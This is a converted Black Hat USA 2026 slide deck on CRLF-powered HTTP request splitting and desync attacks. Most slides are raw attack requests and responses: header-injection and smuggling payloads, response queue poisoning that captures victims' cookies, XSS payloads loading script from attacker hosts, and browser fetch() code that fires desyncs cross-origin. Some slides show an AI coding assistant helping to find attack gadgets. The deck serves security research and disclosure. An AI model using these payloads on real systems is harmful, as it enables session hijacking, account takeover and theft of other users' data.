---
title: "CRLF-Powered Desync Attacks Beheading HTTP Streams"
speakers: ["t0xodile", "mastersplinter"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/t0xodile&mastersplinter_CRLF-Powered Desync Attacks Beheading HTTP Streams.pdf"
pages: 111
sha256: "67b82f72047daa6fb30138d432e747ce62909d7afe94b6ebe1449e4f75cb099d"
text_chars: 40632
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.6
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 111
vision_verified_pages: 111
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:49:05Z"
---
# CRLF-Powered Desync Attacks Beheading HTTP Streams

**Speakers:** t0xodile, mastersplinter  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/t0xodile&mastersplinter_CRLF-Powered Desync Attacks Beheading HTTP Streams.pdf` (111 pages)


## Slide 1

# CRLF-Powered Desync Attacks

## Beheading HTTP Streams

Tom Stacey & Tobia Righi

@t0xodile / @m4st3rspl1nt3r

```text
GET / HTTP/1.1
Host: victim.com
```

```text
GET / HTTP/1.1
Host: victim.com
```

## Slide 2

## The Request Header Injection Impact Gap

```text
GET /%20HTTP/1.1%0d%0aX-Host:%20attacker.com%0d%0aX:%20x HTTP/1.1
Host: example.com
```

```text
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com
```

## Slide 3

## The Request Header Injection Impact Gap

```text
GET /%20HTTP/1.1%0d%0aX-Host:%20attacker.com%0d%0aX:%20x HTTP/1.1
Host: example.com
```

```text
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com
```

## Slide 4

## Research Origins

**Antoine Roly** @aroly.bsky.social · 11mo Request splitting is actually not that uncommon. I found it a couple of times but the exploitation is sometimes tricky.

**Antoine Roly** @aroly.bsky.social · 17 Jan 25 I recently found a cool HTTP request splitting bug. I find it interesting so I wanted to share it.

## Slide 5

## The Research Gap

Making HTTP header injection critical via response queue poisoning

James Kettle - 2022

Creating a desync using header injection

Only 1 vulnerable application mentioned

HTTP Request Splitting Vulnerabilities Exploitation

Sergey Bobrov - 2023

Many many vulnerable applications

Desyncs mentioned, but not used

## Slide 6

## Outline

- HTTP Request Splitting
- CRLF-Powered CL.TE Desyncs
- Browser-Powered CRLF Desyncs
- Response Header Injection
- Defence
- Further Research
- Key Takeaways

## Slide 7

## HTTP/1.1’s Fatal Flaw

```text
GET / HTTP/1.1
Host: example.com
Transfer-Encoding : chunked
Content-Length: 35

0

GET /robots.txt HTTP/1.1
X: x
```

```text
GET / HTTP/1.1
Host: example.com
```

```text
HTTP/1.1 200 OK
```

```text
HTTP/1.1 200 OK

Disallow: /
```

## Slide 8

## HTTP/1.1’s Fatal Flaw

GET /robots

robots.txt prefix

## Slide 9

## HTTP Request Header Injection

**proxy_pass** sends request to backend

**$uri;** executes Nginx’s **normalize** function

```text
# nginx.conf
location / {
    proxy_pass http://backend$uri;
}
```

GET /test/../a/. → GET /a

GET /test/// → GET /test/

GET /test%2f → GET /test/

GET /test%0d%0a → GET /test<?><?>

## Slide 10

## HTTP Request Header Injection

```text
GET /%20HTTP/1.1%0d%0aContent-Length:%20-1%0d%0aX:%20x HTTP/1.1
```

```text
GET / HTTP/1.1
Content-Length: -1
X: x HTTP/1.1
Host: example.com
```

400 Bad Request

## Slide 11

## HTTP Request Header Injection

```text
GET /%20HTTP/1.1%0d%0aContent-Length:%20-1%0d%0aX:%20x HTTP/1.1
```

```text
GET / HTTP/1.1
Content-Length: -1
X: x HTTP/1.1
Host: example.com
```

400 Bad Request

```text
GET /<@urlencode_all> HTTP/1.1
Content-Length: -1
X: x</@urlencode_all> HTTP/1.1
Host: example.com
```

```text
GET /§ HTTP/1.1
Content-Length: -1
X: x§ HTTP/1.1
Host: example.com
```

## Slide 12

## Detecting Request Header Injection

```text
GET /§ HTTP/13.37
Foo: bar§ HTTP/1.1
```

HTTP/1.1 505 Version Not Supported

```text
GET /§ HTTP/1.1
Transfer-Encoding: x
Foo: bar§ HTTP/1.1
```

HTTP/1.1 501 Not Implemented

## Slide 13

# HTTP Request Splitting

## Slide 14

## HTTP Request Splitting

```text
GET /§ HTTP/1.1
Host: example.com
Connection: keep-alive

TRACE / HTTP/1.1
X: x§ HTTP/1.1
Host: example.com
```

HTTP/1.1 200 OK

HTTP/1.1 200 OK

HTTP/1.1 200 OK

HTTP/1.1 200 OK

HTTP/1.1 405 …

## Slide 15

## Response Queue Poisoning via Request Splitting

```text
GET /§ HTTP/1.1
Host: example.com

GET / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

HTTP/1.1 200 OK

```text
GET / HTTP/1.1
Host: example.com
```

HTTP/1.1 200 OK

```text
GET /§ HTTP/1.1
Host: example.com

GET / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

```text
HTTP/1.1 200 OK
Set-Cookie: sess=abcde
```

Attacker receives victim’s response

## Slide 16

## RQP Inside the Infrastructure of a CDN

```text
GET /§ HTTP/1.1
Host: blue.net

GET / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: blue.net
```

Split into **exactly** two requests

```text
GET / HTTP/1.1
Host: blue.net
```

```text
GET / HTTP/1.1
Host: blue.net
```

Desync here

## Slide 17

## RQP Inside the Infrastructure of a CDN

Split into **exactly** two requests

```text
GET / HTTP/1.1
Host: blue.net
```

```text
GET / HTTP/1.1
Host: blue.net
```

```text
HTTP/1.1 200 OK
X-Powered-By: ASP.NET
```

```text
HTTP/1.1 200 OK
X-Powered-By: Express
```

```text
HTTP/1.1 200 OK
X-Powered-By: Next.js
```

Different tech stacks

Desync here

## Slide 18

## Capturing Requests Inside of a CDN

```text
GET /§ HTTP/1.1
Host: blue.net

POST /user/save HTTP/1.1
Host: storage.net
Cookie: SESSID=abcdefg
Content-Length: 5000

store=§ HTTP/1.1
```

Routed to blue.net

```text
GET / HTTP/1.1
Host: blue.net
```

Routed to storage.net

```text
POST /user/save HTTP/1.1
Host: storage.net
Cookie: SESSID=abcdefg
Content-Length: 5000

store= HTTP/1.1
```

Desync here

## Slide 19

## Capturing Requests Inside of a CDN

```text
GET /§ HTTP/1.1
Host: blue.net

POST /user/save HTTP/1.1
Host: storage.net
Cookie: SESSID=abcdefg
Content-Length: 5000

store=§ HTTP/1.1
```

```text
HTTP/1.1 200 OK
...
<input value="HTTP/1.1
Host: storage.net

GET /profile HTTP/1.1
Cookie: SESSID=hijklmno
```

Random live user’s request stored here

Routed to blue.net

```text
GET / HTTP/1.1
Host: blue.net
```

Routed to storage.net

```text
POST /user/save HTTP/1.1
Host: storage.net
Cookie: SESSID=abcdefg
Content-Length: 5000

store= HTTP/1.1
```

Desync here

## Slide 20

## Header Injection via Custom Upstream Header

```text
GET /%0d%0aHost:%20tele.com%0d%0a%0d%0a HTTP/1.1
Host: tele.com
```

HTTP/1.1 400 Bad Request

## Slide 21

## Header Injection via Custom Upstream Header

```text
GET /%0d%0aHost:%20x HTTP/1.1
Host: tele.com
```

```text
GET / HTTP/1.1
Host: tele.com
X-Original-Url: /
Host: x
```

HTTP/1.1 400 Bad Request

Injection in header

## Slide 22

## Header Injection via Custom Upstream Header

```text
GET /%0d%0aHost:%20x HTTP/1.1
Host: tele.com
```

```text
GET / HTTP/1.1
Host: tele.com
X-Original-Url: /
Host: x
```

HTTP/1.1 400 Bad Request

Injection in header

```text
OPTIONS /§

GET / HTTP/1.1
Host: tele.com

§ HTTP/1.1
Host: tele.com
```

```text
OPTIONS / HTTP/1.1
Host: tele.com
X-Original-Url: /

GET / HTTP/1.1
Host: tele.com
```

## Slide 23

## Header Injection via Custom Upstream Header

$20,000

```text
GET /%0d%0aHost:%20x HTTP/1.1
Host: tele.com
```

```text
GET / HTTP/1.1
Host: tele.com
X-Original-Url: /
Host: x
```

HTTP/1.1 400 Bad Request

Injection in header

```text
OPTIONS /§

GET / HTTP/1.1
Host: tele.com

§ HTTP/1.1
Host: tele.com
```

```text
OPTIONS / HTTP/1.1
Host: tele.com
X-Original-Url: /

GET / HTTP/1.1
Host: tele.com
```

```text
HTTP/1.1 200 OK
Allow: OPTIONS, GET
```

```text
HTTP/1.1 200 OK
Allow: OPTIONS, GET
```

```text
HTTP/1.1 200 OK

{”token”:”eyJ...”}
```

## Slide 24

## Header Injection via Non-Path Insertion Points

Injection into cookie

```text
POST /graphql/v1 HTTP/1.1
Host: payment.com
Cookie: sess=abc§
Transfer-Encoding: notchunked
X: x§
```

Injection ends up in path…?

```text
POST /graphql/v1/abc
Transfer-Encoding: notchunked
X: x HTTP/1.1
Host: payment.com
```

501 Not Implemented

## Slide 25

## Header Injection via Non-Path Insertion Points

Injection into cookie

```text
POST /graphql/v1 HTTP/1.1
Host: payment.com
Cookie: sess=abc§
Transfer-Encoding: notchunked
X: x§
```

Injection ends up in path…?

```text
POST /graphql/v1/abc
Transfer-Encoding: notchunked
X: x HTTP/1.1
Host: payment.com
```

501 Not Implemented

```text
POST /graphql/v1 HTTP/1.1
Host: payment.com
Cookie: sess=abc§ HTTP/1.1
Host: payment.com

GET / HTTP/1.1
X: x§
```

```text
POST /graphql/v1/abc HTTP/1.1
Host: payment.com

GET / HTTP/1.1
X: x HTTP/1.1
Host: payment.com
```

## Slide 26

## Header Injection via Non-Path Insertion Points

Injection into cookie

```text
POST /graphql/v1 HTTP/1.1
Host: payment.com
Cookie: sess=abc§
Transfer-Encoding: notchunked
X: x§
```

Injection ends up in path…?

```text
POST /graphql/v1/abc
Transfer-Encoding: notchunked
X: x HTTP/1.1
Host: payment.com
```

501 Not Implemented

```text
POST /graphql/v1 HTTP/1.1
Host: payment.com
Cookie: sess=abc§ HTTP/1.1
Host: payment.com

GET / HTTP/1.1
X: x§
```

```text
POST /graphql/v1/abc HTTP/1.1
Host: payment.com

GET / HTTP/1.1
X: x HTTP/1.1
Host: payment.com
```

Wictor

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK
ACAO: x.ecom

{”card_num”:”...”}
```

```text
HTTP/1.1 200 OK
ACAO: y.ecom

{”card_num”:”...”}
```

## Slide 27

```text
Claude Code v2.1.177

Welcome back splinter!

Opus 4.8 (1M context) · Claude Max ·
tobia@turtlesec.io's Organization
/home/splinter

Tips for getting started
Run /init to create a CLAUDE.md file with instructions for Claude
Note: You have launched claude in your home directory. For the best …

What's new
Fixed tool search to activate even with `ANTHROPIC_BASE_URL` as long…
Added `w` key in `/copy` to write the focused selection directly to …
Added optional description argument to `/plan` (e.g., `/plan fix the…

❯ Hey Claude, what headers produce predictable response codes?

●

✳ Crunched for 22s

❯

? for shortcuts · ← for agents
```

## Slide 28

```text
Claude Code v2.1.177

Welcome back splinter!

Opus 4.8 (1M context) · Claude Max ·
tobia@turtlesec.io's Organization
/home/splinter

Tips for getting started
Run /init to create a CLAUDE.md file with instructions for Claude
Note: You have launched claude in your home directory. For the best …

What's new
Fixed tool search to activate even with `ANTHROPIC_BASE_URL` as long…
Added `w` key in `/copy` to write the focused selection directly to …
Added optional description argument to `/plan` (e.g., `/plan fix the…

❯ Hey Claude, what headers produce predictable response codes?

● Expect: asdf

✳ Crunched for 22s

❯

? for shortcuts · ← for agents
```

```text
GET /§ HTTP/1.1
Expect: asdf
X: x§ HTTP/1.1
Host: example.com
```

HTTP/1.1 417 Expectation Failed

## Slide 29

## Request Splitting Blocked

```text
GET /§ HTTP/1.1
Host: example.com

GET / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

\r\n\r\n

```text
GET /§ HTTP/1.1
Random_header: asdf
Foo: bar§ HTTP/1.1
Host: example.com
```

```text
HTTP/1.1 400 Bad Request
Connection: close
```

On any attempt to inject a second CRLF sequence

HTTP/1.1 200 OK

## Slide 30

# CRLF-Powered CL.TE Desyncs

## Slide 31

## Detecting CRLF-Powered CL.TE Desyncs

```text
POST /§ HTTP/1.1
Transfer-Encoding: notchunked
Foo: bar§ HTTP/1.1
Host: example.com
Content-Length: 0
```

HTTP/1.1 501 Not Implemented

HTTP/1.1 400 Bad Request

## Slide 32

## Detecting CRLF-Powered CL.TE Desyncs

```text
POST /§ HTTP/1.1
Transfer-Encoding: notchunked
Foo: bar§ HTTP/1.1
Host: example.com
Content-Length: 0
```

HTTP/1.1 501 Not Implemented

HTTP/1.1 400 Bad Request

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: example.com
Content-Length: 13

d
x=y
0
```

–TIMEOUT–

## Slide 33

## The Desync Disaster

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: clothes.shop
Content-Length: 66

0

POST /user/update?name=t0xodile
Cookie: SESSID=abcdefg
X: x
```

```text
GET / HTTP/1.1
Host: clothes.shop
```

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK
Set-Cookie: SESSID=abcdefg

Profile Updated
```

## Slide 34

## The Desync Disaster

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: clothes.shop
Content-Length: 66

0

POST /user/update?name=t0xodile
Cookie: SESSID=abcdefg
X: x
```

```text
GET / HTTP/1.1
Host: clothes.shop
```

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK
Set-Cookie: SESSID=abcdefg

Profile Updated
```

Session Fixation

## Slide 35

## The Desync Disaster

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: clothes.shop
Content-Length: 66

0

POST /user/update?name=t0xodile
Cookie: SESSID=abcdefg
X: x
```

```text
GET / HTTP/1.1
Host: clothes.shop
```

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK
Set-Cookie: SESSID=abcdefg

Profile Updated
```

Session Fixation

## Slide 36

## The Desync Disaster

$2,200

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: clothes.shop
Content-Length: 66

0

POST /user/update?email=t0x@atk.cc
Cookie: SESSID=abcdefg
X: x
```

Attacker email

```text
GET / HTTP/1.1
Host: clothes.shop
```

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK

Profile Updated
```

Attacker’s email replaces victim’s

## Slide 37

## The Nested Response Mystery

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: account.phones.com
Content-Length: 87

0

GET / HTTP/1.1
Host: account.phones.com
x-req-id: <img/src/onerror=alert(1)>
```

Not text/html

```text
HTTP/1.1 404 Not Found
Content-Type: application/octet-stream

Not FoundHTTP/1.1 400 Bad Request
Content-Type: application/octet-stream

X-Req-Id=<img/src/onerror=alert(1)>
```

## Slide 38

## The Nested Response Mystery

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: account.phones.com
Content-Length: 87

0

GET / HTTP/1.1
Host: account.phones.com
x-req-id: <img/src/onerror=alert(1)>
```

```text
HTTP/1.1 404 Not Found
Content-Type: application/octet-stream

Not FoundHTTP/1.1 400 Bad Request
Content-Type: application/octet-stream

X-Req-Id=<img/src/onerror=alert(1)>
```

@DFrojdendahl

```text
HTTP/1.1 200 OK
Content-Type: text/html

...
</html>HTTP/1.1 400 Bad Request
Content-Type: application/octet-stream

X-Req-Id=<img/src/onerror=fetch()>
```

## Slide 39

## The Nested Response Mystery

$500

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: account.phones.com
Content-Length: 87

0

GET / HTTP/1.1
Host: account.phones.com
x-req-id: <img/src/onerror=alert(1)>
```

```text
HTTP/1.1 404 Not Found
Content-Type: application/octet-stream

Not FoundHTTP/1.1 400 Bad Request
Content-Type: application/octet-stream

X-Req-Id=<img/src/onerror=alert(1)>
```

@DFrojdendahl

```text
HTTP/1.1 200 OK
Content-Type: text/html

...
</html>HTTP/1.1 400 Bad Request
Content-Type: application/octet-stream

X-Req-Id=<img/src/onerror=fetch()>
```

Victim account linked to attacker session

## Slide 40

## Denial of Service via Cache Poisoning

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: cdn.doomscroll.com
Content-Length: 46

0

GET /images/randomlogo.png HTTP/1.1
X: x
```

```text
GET / HTTP/1.1
Host: cdn.doomscroll.com
```

```text
HTTP/1.1 200 OK
X-Cache: MISS
```

```text
HTTP/1.1 200 OK
X-Cache: MISS
```

```text
HTTP/1.1 200 OK
X-Cache: MISS
```

```text
HTTP/1.1 200 OK
X-Cache: MISS
```

```text
HTTP/1.1 200 OK
X-Cache: HIT

<image>
```

## Slide 41

## The HEAD Technique

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: cdn.doomscroll.com
Content-Length: 107

0

HEAD / HTTP/1.1

GET / HTTP/1.1
X-Reflect:<img/src/onerror=fetch()>
Content-Length: 100

x=y
```

```text
HEAD / HTTP/1.1
Host: cdn.doomscroll.com

GET / HTTP/1.1
X-Reflect: <img/src/onerror=fetch()>
Content-Length: 100

x=y
```

## Slide 42

## The HEAD Technique

```text
GET / HTTP/1.1
X-Reflect: <img/src/onerror=fetch()>
Content-Length: 100

x=y
```

```text
GET / HTTP/1.1
Host: cdn.doomscroll.com
```

Waiting for bytes

```text
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 54
```

## Slide 43

## The HEAD Technique

```text
GET / HTTP/1.1
X-Reflect: <img/src/onerror=fetch()>
Content-Length: 100

x=yGET / HTTP/1.1
Host: cdn.doomscroll.com
```

Victim’s req appended to prefix

Waiting for bytes

```text
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 54
```

## Slide 44

## The HEAD Technique

```text
GET / HTTP/1.1
X-Reflect: <img/src/onerror=fetch()>
Content-Length: 100

x=yGET / HTTP/1.1
Host: cdn.doomscroll.com
```

Victim’s req appended to prefix

Waiting for bytes

```text
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 54
```

CL not long enough

```text
HTTP/1.1 204 No Content
X-Reflect: <img/src/onerro
```

## Slide 45

## The HEAD Technique

```text
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 54
```

CL not long enough

```text
HTTP/1.1 204 No Content
X-Reflect: <img/src/onerro
```

## Slide 46

```text
Claude Code v2.1.177

Welcome back splinter!

Opus 4.8 (1M context) · Claude Max ·
tobia@turtlesec.io's Organization
/home/splinter

Tips for getting started
Run /init to create a CLAUDE.md file with instructions for Claude
Note: You have launched claude in your home directory. For the best …

What's new
Fixed tool search to activate even with `ANTHROPIC_BASE_URL` as long…
Added `w` key in `/copy` to write the focused selection directly to …
Added optional description argument to `/plan` (e.g., `/plan fix the…

❯ What Nginx response code produces a length between x and y?

● 414 URI Too Long

✳ Crunched for 22s

❯

? for shortcuts · ← for agents
```

HTTP/1.1 414 URI Too Long

## Slide 47

## AI-Generated HEAD Gadget

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: cdn.doomscroll.com
Content-Length: <correct>

0

HEAD /?<a*1000> HTTP/1.1

GET / HTTP/1.1
X-Reflect: <img/src/onerror=fetch()>
Content-Length: 100

x=y
```

```text
GET / HTTP/1.1
Host: cdn.doomscroll.com
```

HTTP/1.1 200 OK

```text
HTTP/1.1 414 URI Too Long
Content-Type: text/html
Content-Length: 61

HTTP/1.1 204 No Content
X-Reflect: <img/src/onerror=fetch()>
```

## Slide 48

# Browser-Powered CRLF Desyncs

## Slide 49

## Browser-Powered CRLF Desyncs

```text
GET /§ HTTP/1.1
Host: example.com

GET / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

Request Splitting Desync

https://attacker.com

```js
fetch(
    "https://example.com/%20HTTP/1.1%0d%0a
    Host:%20example.com%0d%0a%0d%0a
    GET%20/%20HTTP/1.1%0d%0a
    Foo:%20bar"
)
```

```text
POST /§ HTTP/1.1
Transfer-Encoding: chunked
Foo: bar§ HTTP/1.1
Host: example.com
Content-Length: 27

0

TRACE / HTTP/1.1
X: x
```

CL.TE Desync

https://attacker.com

```js
fetch(
    "https://example.com/%20HTTP/1.1%0d%0a
    Transfer-Encoding:%20chunked%0d%0a
    Foo:%20bar",
    {
        method: "POST",
        body: "0\r\n\r\nTRACE / HTTP/1.1\r\nX: x"
    }
)
```

## Slide 50

## CRLF-Powered Desync Worms

XSS fires desync

## Slide 51

## CRLF-Powered Desync Worms

XSS fires desync

## Slide 52

# Scope-Limited Desyncs

## Slide 53

## HTTP Request Tunnelling

Nginx Changelog: 24-03-2026v1.27.9 - “Change: now the ‘keepalive’ directive in the ‘upstream’ block is enabled by default.”

## Slide 54

## Bypassing Blind Request Tunnelling

```text
GET /§ HTTP/1.1
Host: example.com

TRACE / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

HTTP/1.1 200 OK

TRACE response never comes back…

## Slide 55

## Bypassing Blind Request Tunnelling

```text
GET /§ HTTP/1.1
Host: example.com

TRACE / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

HTTP/1.1 200 OK

```text
GET /§ HTTP/1.1
Host: example.com
Expect: 100-continue

TRACE / HTTP/1.1
Foo: bar§ HTTP/1.1
Host: example.com
```

```text
HTTP/1.1 100 Continue

HTTP/1.1 200 OK

HTTP/1.1 405 Method Not Allowed
```

No Content-Length Header?

## Slide 56

## Bypassing Access Controls via Request Tunnelling

```text
GET /config HTTP/1.1
Host: carmanufacturer.com
```

HTTP/1.1 403 Forbidden

```text
GET /robots.txt§ HTTP/1.1
Host: carmanufacturer.com
Expect: 100-continue

GET /config HTTP/1.1
X: x§ HTTP/1.1
Host: carmanufacturer.com
```

```text
HTTP/1.1 100 Continue

HTTP/1.1 200 OK

Disallow: /HTTP/1.1 200 OK
Content-Type: application/json

{"config":{"...”}}
```

## Slide 57

## Bypassing Response Header Removal

```text
GET /§ HTTP/1.1
Expect: 100-continue
Foo: bar§ HTTP/1.1
Host: shop.minisoft.com
```

```text
HTTP/1.1 100 Continue

HTTP/1.1 200 OK
x-fd-int-roxy-origin-ip: <redacted>
x-fd-int-roxy-origin-name: <redacted>
x-fd-int-roxy-origin-url: <redacted>
x-fd-int-roxy-upstream-error-info: <redacted>
x-fd-int-roxy-originshield-parent: <redacted>
```

## Slide 58

# Browser-Powered CRLF Desyncs

## Slide 59

## Browser-Powered 0.CL - Streaming Service

Same keep-alive connection

```text
GET /images/§ HTTP/1.1
Content-Length: 7
X: x§ HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive
```

```text
GET /images/§ HTTP/1.1
Content-Length: 7
X: x§ HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive
```

Same keep-alive connection

HTTP/1.1 200 OK

HTTP/1.1 400 Bad Request

CL header eats 7 bytes off next request

## Slide 60

## Browser-Powered 0.CL - Streaming Service

Same keep-alive connection

```text
GET /images/§ HTTP/1.1
Content-Length: 23
X: x§ HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive
```

```text
GET /images/§ HTTP/1.1
HEAD /50x.html HTTP/1.1
Host: localhost

GET /status<svg/onload=alert(1)> HTTP/1.1
Host: secure.streaming.net

§ HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive
```

23 bytes

Same keep-alive connection

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK
Content-Type: text/html

HTTP/1.1 307 Temporary Redirect
Location: /status<svg/onload=alert(1)>
```

## Slide 61

## Browser-Powered 0.CL - Streaming Service

https://attacker.com

```text
1. window.open()
```

```text
https://secure.streaming.com/%20HTTP/1.1%0d%0a
Content-Length:%2023%0d%0aX:%20x
```

This allows us to inject a Content-Length header cross-origin, leaving the backend waiting for more bytes.

```text
GET / HTTP/1.1
Content-Length: 23
X: x HTTP/1.1
Host: secure.streaming.com
Connection: keep-alive
```

## Slide 62

## Browser-Powered 0.CL - Streaming Service

https://attacker.com

```text
1. window.open()

2. location =
```

Same keep-alive connection

```text
https://secure.streaming.com/%20HTTP/1.1%0d%0aContent-Length:%2023%0d%0aX:%20x
```

```text
https://secure.streaming.com/images/%20HTTP/1.1%0d%0aHEAD%20/50x.html%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/status%3Csvg/onload=alert(1)%3E%20HTTP/1.1%0d%0aHost:%20secure.streaming.net%0d%0a%0d%0a
```

## Slide 63

## Browser-Powered 0.CL - Streaming Service

https://secure.streaming.com

```text
...com/images/%20HTTP/1.1%0d%0aHEAD%20/50x.html%20HTTP/1.1...
```

secure.[redacted].com says

[redacted]@icloud.com

OK

Same keep-alive connection

HTTP/1.1 200 OK

```text
HTTP/1.1 200 OK
Content-Type: text/html

HTTP/1.1 307 Temporary Redirect
Location: /status<svg/onload=alert(1)>
```

## Slide 64

## Browser-Powered 0.CL - Streaming Service

$5,000

All this effort… for XSS

Show this to a developer that just finished implementing DOMPurify

## Slide 65

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue

TRACE / HTTP/1.1
X: x§ HTTP/2
Host: proxy.account.software.com
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

## Slide 66

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue

TRACE / HTTP/1.1
X: x§ HTTP/2
Host: proxy.account.software.com
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

## Slide 67

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue

TRACE / HTTP/1.1
X: x§ HTTP/2
Host: proxy.account.software.com
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

## Slide 68

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue

TRACE / HTTP/1.1
X: x§ HTTP/2
Host: proxy.account.software.com
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

```text
HTTP/2 100 Continue

HTTP/1.1 200 OK
```

HTTP/2 405 Method Not Allowed

## Slide 69

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue

HEAD /docs/index.html HTTP/1.1
Range: bytes=1-2
X: x§ HTTP/2
Host: proxy.account.software.com
```

```text
HTTP/1.1 206 Partial Content
Content-Type: text/html
Content-Range: bytes 1-2/XXXXX
Content-Length: 2

ht
```

We control how much the frontend will over-read

Any request we add after HEAD will have its full response concatenated as the body of the 206 Partial Content response

## Slide 70

## Browser-Powered Request Splitting

Right now we can:

- Stitch together arbitrary responses.
- Control how much the upstream will read using Range.

**We need a reflection gadget!**

## Slide 71

## Browser-Powered Request Splitting

Right now we can:

- Stitch together arbitrary responses.
- Control how much the upstream will read using Range.

**We need a reflection gadget!**

```text
POST /docs/ HTTP/1.1
Host: proxy.account.software.com
Content-Length: 21

<img/src=x/onerror=a>
```

```text
HTTP/1.1 400 Bad Request

"Unexpected token '<', \"<img/src=x/onerror=a>\"... is not valid JSON"
```

## Slide 72

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue
Range: bytes=1-2

HEAD /docs/ HTTP/1.1
Host: proxy.account.software.com
Range: bytes=1-650

POST /docs/ HTTP/1.1
Host: proxy.account.software.com
Content-Length: 20

<script/src=\\atk.cc>§ HTTP/2
Host: proxy.account.software.com
```

```text
HTTP/2 206 Partial Content
Content-Type: text/html
Content-Range: bytes 1-650/X
Content-Length: X

HTTP/1.1 400 Bad Request

"Unexpected token '<,
\"<script/src=\\atk.cc>
 \" is not validJSON"
```

No closing script tag!

## Slide 73

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue
Range: bytes=1-2

HEAD /docs/ HTTP/1.1
Host: proxy.account.software.com
Range: bytes=1-650

POST /docs/ HTTP/1.1
Host: proxy.account.software.com
Content-Length: 20

<script/src=\\atk.cc>GET /index.html HTTP/1.1
Range: bytes=2828-2836
X: x§ HTTP/2
Host: proxy.account.software.com
```

9 bytes

```text
HTTP/2 206 Partial Content
Content-Type: text/html
Content-Range: bytes 1-650/X
Content-Length: X

HTTP/1.1 400 Bad Request

"Unexpected token '<,
\"<script/src=\\atk.cc>
 \" is not validJSON"HTTP/1.1 206
 Content-Range: bytes 2828-2836/X
 Content-Length: 9

</script>
```

## Slide 74

## Browser-Powered Request Splitting

```text
GET /docs/index.html§? HTTP/1.1
Host: proxy.account.software.com
Expect: 100-continue
Range: bytes=1-2

HEAD /docs/ HTTP/1.1
Host: proxy.account.software.com
Range: bytes=1-650

POST /docs/ HTTP/1.1
Host: proxy.account.software.com
Content-Length: 20

<script/src=\\atk.cc>GET /index.html HTTP/1.1
Range: bytes=2828-2836
X: x§ HTTP/2
Host: proxy.account.software.com
```

Now we have a browser issuable desync which **_inconsistently_** returns our XSS payload.

Speed is our ally to make sure we hit the XSS.

`window.open() + location`

- not consistent enough.

IFRAMES

## Slide 75

## Browser-Powered Request Splitting - Iframe Madness

https://attacker.com

</>

## Slide 76

## Browser-Powered Request Splitting - Iframe Madness

https://attacker.com

</> </>

## Slide 77

## Browser-Powered Request Splitting - Iframe Madness

https://attacker.com

</> </> </> </>
</> </> </> </>

## Slide 78

